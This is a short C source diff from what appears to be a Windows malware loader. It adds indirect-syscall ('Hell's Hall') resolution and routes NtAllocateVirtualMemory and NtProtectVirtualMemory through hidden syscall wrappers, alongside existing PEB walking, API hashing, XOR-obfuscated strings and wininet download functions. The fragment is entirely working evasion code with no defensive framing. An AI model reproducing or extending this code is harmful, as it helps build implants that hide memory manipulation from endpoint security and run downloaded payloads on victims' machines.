@@ -4,6 +4,7 @@
 #include "peb_walk.h"
 #include "hash.h"
 #include "xor_string.h"
+#include "syscalls.h"
 
 api_t g_api;
 
@@ -61,6 +62,14 @@ int resolve_apis(void) {
         !g_api.InternetReadFile || !g_api.InternetCloseHandle) {
         return 5;
     }
+
+    /* S34: resolve Hell's Hall SSNs + gadget, then wire the two Nt*
+     * wrappers. Must happen after kernelbase/wininet so that early-failure
+     * paths can exit cleanly via g_api.ExitProcess. */
+    if (syscalls_init() != 0) return 6;
+    g_api.NtAllocateVirtualMemory = hh_NtAllocateVirtualMemory;
+    g_api.NtProtectVirtualMemory  = hh_NtProtectVirtualMemory;
+
     return 0;
 }
 
